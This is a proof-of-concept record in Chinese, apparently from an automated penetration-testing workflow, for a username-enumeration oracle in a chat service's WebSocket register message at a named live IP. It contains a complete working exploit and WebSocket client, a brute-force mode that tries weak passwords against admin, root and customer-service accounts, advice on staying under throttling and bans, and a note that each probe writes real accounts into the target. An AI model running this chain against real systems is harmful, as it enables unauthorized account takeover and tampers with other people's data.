# 夜好推客服系统 /ws/chat WS register 用户名枚举 oracle（已注册 vs 新用户名回显可区分）

- **code**: yehaotui-ws-chat-register-username-enum-oracle
- **kind**: poc
- **category**: info-leak
- **component**: 夜好推客服系统（WebSocket /ws/chat 聊天服务）
- **severity**: low
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 task#1 实测于 82.156.110.36:9800（经环境 HTTP_PROXY 隧道直连，脚本 /opt/artex/data/tasks/1/i27/kprobe.py，自制最小 RFC6455 客户端）：未登录新连接发 {"type":"register","username":"pwn1794396611","password":"x","nickname":"x"} → 回 {"action":"register","message":"用户名已被注册","success":false,"type":"auth"}；换新连接发新名 zz_new_9f8a7b_1794399942 → 回 {"action":"register","message":"注册成功","success":true,"token":"<REDACTED>","type":"auth"}。两句均为未登录状态下直接回显，差异稳定可复现，故判定枚举 oracle 成立。侧证：login 侧无此差异（有效用户/不存在用户均回「用户名或密码错误」），枚举面只在 register。
- **path**: pocs/yehaotui-ws-chat-register-username-enum-oracle/poc.py
- **tags**: websocket, ws, register, username-enum, oracle, 用户名枚举, 客服系统, rfc6455, info-leak, 夜好推
- **created_at**: 2026-11-11T12:48:10.274Z
- **engine**: http://82.156.110.36:9800/chat （WS: ws://82.156.110.36:9800/ws/chat）

## 描述

夜好推客服系统前端 http://<host>:9800/chat 背后的聊天服务挂在 WebSocket /ws/chat 上，其 register 消息在未认证状态下即可探测用户名是否已存在：已注册名回「用户名已被注册」，新名回「注册成功」（并直接签发 token），二者回显稳定可区分，构成用户名枚举 oracle。用途：动手爆破/撞库前先用它拿到系统内真实存在的账号清单（含 admin、客服等管理类账号是否启用），显著缩小后续口令面。注意 login 侧对存在与不存在用户返回同一句错误，无法用于枚举，枚举面只在 register。

## 用法

```
前置：目标前端形如 http://<IP>:9800/chat；WS 入口 /ws/chat，只需一次 WS upgrade 握手，无需任何凭据。每一次 register 探测都要用「全新连接」——成功注册后该连接进入登录会话态，会阻断同连接的后续 auth 消息（脚本用 one() 每次重连来规避）。

判据（在收到 type=auth 的 JSON 上做字符串/字段判断）：
  message 含「已被注册」                          → 该用户名已存在（枚举命中）
  success=true 且 message 含「注册成功」 + token   → 用户名不存在（枚举未命中）
  两者之外（NO_REPLY / 其它 message）              → 视为异常，别计入结果

用法：
  python poc.py enum        # 自检：跑一遍已存在名 vs 新名，确认 oracle 可复现
  python poc.py brute       # 附带的严格限幅弱口令自检（每账号 <=5 口令、独立连接、间隔 1.5s）
  python poc.py correct     # 打印「注册成功 + 正确口令登录」的成功回显形状

改目标：把 ws.py 顶部 HOST/PORT/PATH 换成你的目标即可（默认 82.156.110.36:9800 /ws/chat）。
出口：脚本自动读环境变量 HTTP_PROXY/ALL_PROXY，用 HTTP CONNECT 隧道（支持 Proxy-Authorization）；本环境需走代理才能直连该 IP。直连可用时置空 PROXY 即可。

注意事项 / 失败常见原因：
  1) 复用连接 → 第二次 auth 消息无回显。必须每探测一次重开 WS。
  2) 未握手成功（非 101）→ 后续帧全部无响应；kprobe 的 do_handshake 返回头里若不是 HTTP/1.1 101 就别继续。
  3) 注册是「真写库」：对新名字探测会真的建出一个账号（回显里带 token）。所以每个候选名只打一次，并把自己打过的空闲名单独记账，否则下一轮会把自己的号误判为「已存在」。
  4) 频率不要拉满：目标对高频 auth 有节流风险，脚本内 sleep 1.5s 是实测可用的保守值。
  5) 别指望 login 侧做枚举：有效/不存在用户返回同一条「用户名或密码错误」。
```

## 正文

```
# 夜好推客服系统 /ws/chat —— WS register 用户名枚举 oracle

目标形态: http://<IP>:9800/chat  →  WS: ws://<IP>:9800/ws/chat
无需认证，一次 WS upgrade 握手即可探测。

## 为什么这是 oracle

未登录状态下直接发 register：
  已存在的用户名 → {"action":"register","message":"用户名已被注册","success":false,"type":"auth"}
  新用户名       → {"action":"register","message":"注册成功","success":true,"token":"...","type":"auth"}
两条回显稳定可区分 ⇒ 可批量判别「某账号是否已注册」。
login 侧无差异（存在/不存在用户都回同一条「用户名或密码错误」），枚举面只在 register。

## 最小复现（原始验证脚本，i27/kprobe.py）

# 依赖同目录/同会话的 ws.py（最小 RFC6455 客户端，附在下方）
# 每次 login/register 都用全新 WS 连接：登录后会话态会阻断同连接上后续的 auth 消息
import json, sys, time, os
sys.path.insert(0, ".")            # ws.py 所在目录
from ws import connect, do_handshake, send_frame, recv_frame

def drain(s, sec):
    end = time.time()+sec; msgs=[]
    while time.time() < end:
        try: f = recv_frame(s, timeout=max(0.3, end-time.time()))
        except Exception: break
        if f is None: break
        op, data = f
        if op == 9: send_frame(s, data, opcode=10); continue
        if op == 8: break
        if op in (1,2): msgs.append(data.decode(errors="replace"))
    return msgs

def one(msg, sec=4):
    s = connect(); do_handshake(s); time.sleep(0.3); drain(s,1.0)
    send_frame(s, json.dumps({"type":"connect"}))       # 匿名会话，拿 temp webUserId
    drain(s,1.2)
    send_frame(s, json.dumps(msg))
    got = drain(s, sec)
    s.close()
    out=""
    for g in got:
        try:
            j=json.loads(g)
            if j.get("type")=="auth": return j
        except Exception:
            pass
        out=g
    return {"raw": out}

def login(u,p): return one({"type":"login","username":u,"password":p})
def reg(u,p,n="x"): return one({"type":"register","username":u,"password":p,"nickname":n})

if __name__=="__main__":
    mode = sys.argv[1] if len(sys.argv)>1 else "enum"
    if mode=="enum":
        # 自检：已存在名 vs 新名，回显差异即 oracle
        print("valid-user wrong-pw :", json.dumps(login("<已知存在的测试账号>","wrongpw"), ensure_ascii=False))
        time.sleep(1.5)
        print("nonexist wrong-pw   :", json.dumps(login("zz_notexist_9f8a7b","wrongpw"), ensure_ascii=False))
        time.sleep(1.5)
        print("register existing   :", json.dumps(reg("<已知存在的测试账号>","whatever123"), ensure_ascii=False))
        time.sleep(1.5)
        print("register new random :", json.dumps(reg("zz_new_9f8a7b_%d"%int(time.time()),"whatever123"), ensure_ascii=False))
    elif mode=="brute":
        # 严格限幅：每账号 <=5 口令，独立连接，失败间 sleep
        accounts = ["admin","administrator","manager","kefu","客服","operator","root","boss","agent","system"]
        pws = ["123456","admin","admin123","12345678","password"]
        for a in accounts:
            for i,p in enumerate(pws):
                try:
                    r = login(a,p)
                except Exception as e:
                    print("[ERR]",a,p,e); break
                ok = r.get("success")
                print("[%s] %s/%s -> %s" % ("HIT" if ok else "no", a, p, json.dumps(r,ensure_ascii=False)[:220]))
                if ok:
                    print("*** HIT token:", r.get("token"))
                    break
                time.sleep(1.5)
    elif mode=="correct":
        import random
        u="pf%d"%random.randint(100000,999999); p="Aa123456!"
        print("reg:", json.dumps(reg(u,p),ensure_ascii=False)[:200]); time.sleep(1.5)
        print("login correct:", json.dumps(login(u,p),ensure_ascii=False)[:300]); time.sleep(1.5)
        print("login wrong  :", json.dumps(login(u,"nope123"),ensure_ascii=False)[:200])

## ws.py —— 最小 RFC6455 客户端（无外部依赖，支持 HTTP 代理 CONNECT）

```python
#!/usr/bin/env python3
# Minimal RFC6455 WebSocket client (no external deps), supports plain HTTP proxy CONNECT.
import socket, base64, os, struct, json, sys, time, ssl

HOST = "82.156.110.36"     # ← 换目标
PORT = 9800
PATH = "/ws/chat"
PROXY = os.environ.get("HTTP_PROXY") or os.environ.get("ALL_PROXY") or ""
UA = os.environ.get("ARTEX_UA", "Mozilla/5.0")

def parse_proxy(p):
    if not p: return None
    p = p.split("://",1)[-1]
    creds, hostport = (p.split("@",1) if "@" in p else (None,p))
    host, _, port = hostport.partition(":")
    cred = base64.b64encode(creds.encode()).decode() if creds else None
    return (host, int(port or 80), cred)

def connect():
    pr = parse_proxy(PROXY)
    if pr:
        s = socket.create_connection((pr[0], pr[1]), timeout=15)
        req = f"CONNECT {HOST}:{PORT} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
        if pr[2]:
            req += f"Proxy-Authorization: Basic {pr[2]}\r\n"
        req += "\r\n"
        s.sendall(req.encode())
        buf = b""
        while b"\r\n\r\n" not in buf:
            d = s.recv(4096)
            if not d: raise RuntimeError("proxy closed")
            buf += d
        if b" 200 " not in buf.split(b"\r\n",1)[0]:
            raise RuntimeError("proxy CONNECT failed: " + buf.split(b"\r\n",1)[0].decode(errors="replace"))
    else:
        s = socket.create_connection((HOST, PORT), timeout=15)
    return s

def do_handshake(s, extra_headers=""):
    key = base64.b64encode(os.urandom(16)).decode()
    req = (f"GET {PATH} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
           f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
           f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n"
           f"User-Agent: {UA}\r\nOrigin: http://{HOST}:{PORT}\r\n"
           f"{extra_headers}"
           f"\r\n")
    s.sendall(req.encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        d = s.recv(4096)
        if not d: break
        buf += d
    head = buf.split(b"\r\n\r\n",1)[0].decode(errors="replace")
    return head      # 期望 HTTP/1.1 101

def send_frame(s, data, opcode=1):
    if isinstance(data, str): data = data.encode()
    b1 = 0x80 | opcode
    ln = len(data)
    hdr = bytes([b1])
    if ln < 126:
        hdr += bytes([0x80 | ln])
    elif ln < 65536:
        hdr += bytes([0x80 | 126]) + struct.pack(">H", ln)
    else:
        hdr += bytes([0x80 | 127]) + struct.pack(">Q", ln)
    mask = os.urandom(4)
    masked = bytes(data[i]^mask[i%4] for i in range(ln))
    s.sendall(hdr + mask + masked)

def recv_exact(s, n):
    buf = b""
    while len(buf) < n:
        d = s.recv(n-len(buf))
        if not d: raise RuntimeError("closed")
        buf += d
    return buf

def recv_frame(s, timeout=8):
    s.settimeout(timeout)
    try:
        h = recv_exact(s, 2)
    except Exception:
        return None
    b1, b2 = h[0], h[1]
    opcode = b1 & 0x0f
    masked = b2 & 0x80
    ln = b2 & 0x7f
    if ln == 126:
        ln = struct.unpack(">H", recv_exact(s,2))[0]
    elif ln == 127:
        ln = struct.unpack(">Q", recv_exact(s,8))[0]
    mask = recv_exact(s,4) if masked else None
    data = recv_exact(s, ln) if ln else b""
    if mask:
        data = bytes(data[i]^mask[i%4] for i in range(len(data)))
    return (opcode, data)
```

## 实测回显（2026-11-11, 82.156.110.36:9800）

匿名 connect:
  {"type":"connect","authenticated":false,"success":true,"webUserId":"temp_..."}
register 已存在的测试账号:
  {"action":"register","message":"用户名已被注册","success":false,"type":"auth"}
register 新随机名:
  {"action":"register","message":"注册成功","success":true,"token":"<REDACTED>","type":"auth"}
login 侧（无法枚举）:
  存在的账号 / 不存在的账号 均回同一条「用户名或密码错误」

## 后续用法

先用本 oracle 把 admin / administrator / manager / kefu / 客服 / operator / root / boss / agent / system 等常见管理类名过一遍，
拿到真实存在的账号清单后，再对这些账号做「严格限幅」的口令验证（每账号 <=5 口令、独立连接、间隔 >=1.5s），避免触发节流/封禁。

```
